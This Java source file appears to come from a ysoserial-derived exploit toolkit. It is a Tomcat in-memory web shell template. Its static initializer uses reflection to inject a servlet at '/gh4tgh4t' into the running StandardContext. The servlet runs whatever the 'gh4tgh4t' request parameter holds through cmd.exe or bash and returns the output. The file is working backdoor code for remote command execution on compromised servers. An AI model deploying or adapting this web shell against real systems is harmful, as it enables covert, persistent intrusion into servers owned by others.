package ysoserial.bullet.template.tomcat;

import org.apache.catalina.WebResourceRoot;
import org.apache.catalina.Wrapper;
import org.apache.catalina.core.StandardContext;
import org.apache.catalina.loader.WebappClassLoaderBase;

import javax.servlet.*;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.IOException;
import java.lang.reflect.Field;

public class TomcatServlet implements Servlet {

    private static String param = "gh4tgh4t";

    private static String servletUrlPattern = "/gh4tgh4t";

    static{
        try{
            WebappClassLoaderBase webappClassLoaderBase = (WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();
            Field resourcesF = webappClassLoaderBase.getClass().getSuperclass().getDeclaredField("resources");
            resourcesF.setAccessible(true);
            WebResourceRoot resources = (WebResourceRoot) resourcesF.get(webappClassLoaderBase);
            StandardContext standardContext = (StandardContext) resources.getContext();

            TomcatServlet myServlet = new TomcatServlet();

            Wrapper newWrapper = standardContext.createWrapper();
            String name = myServlet.getClass().getSimpleName();
            newWrapper.setName(name);
            newWrapper.setLoadOnStartup(1);
            newWrapper.setServlet(myServlet);
            newWrapper.setServletClass(myServlet.getClass().getName());

            standardContext.addChild(newWrapper);
            standardContext.addServletMapping(servletUrlPattern, name);
        }catch (Exception e){
            e.printStackTrace();
        }
    }

    @Override
    public void init(ServletConfig config) throws ServletException {}

    @Override
    public String getServletInfo() {return null;}

    @Override
    public void destroy() {}    public ServletConfig getServletConfig() {return null;}

    @Override
    public void service(ServletRequest servletRequest, ServletResponse servletResponse) throws ServletException, IOException {
        HttpServletRequest req = (HttpServletRequest) servletRequest;
        HttpServletResponse resp = (HttpServletResponse) servletResponse;

        String string = req.getParameter(param);
        if (string != null){
            String osName = System.getProperty("os.name");
            String[] cmd = osName != null && osName.toLowerCase().contains("win") ? new String[]{"cmd.exe","/c",string} : new String[]{"/bin/bash","-c",string};

            Process process = Runtime.getRuntime().exec(cmd);
            java.io.BufferedReader bufferedReader = new java.io.BufferedReader(new java.io.InputStreamReader(process.getInputStream()));
            StringBuilder stringBuilder = new StringBuilder();
            String line;
            while ((line = bufferedReader.readLine()) != null) {
                stringBuilder.append(line + '\n');
            }
            servletResponse.getOutputStream().write(stringBuilder.toString().getBytes());
            servletResponse.getOutputStream().flush();
            servletResponse.getOutputStream().close();
        }
        else{
            resp.sendError(HttpServletResponse.SC_NOT_FOUND);
        }
    }
}
